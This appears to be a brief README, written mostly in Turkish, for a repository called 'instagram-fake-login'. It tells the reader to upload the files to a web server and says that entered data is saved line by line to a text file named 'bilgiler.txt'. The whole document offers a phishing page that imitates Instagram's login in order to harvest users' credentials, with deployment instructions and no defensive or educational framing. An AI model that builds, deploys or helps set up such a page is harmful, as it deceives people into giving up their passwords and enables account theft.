# instagram-fake-login
instagram script.
sadece dosyaları kopyalayın ve web sunucunuza yükleyin girilen verileri "bilgiler.txt" dosyasına alt alta yazacaktır.
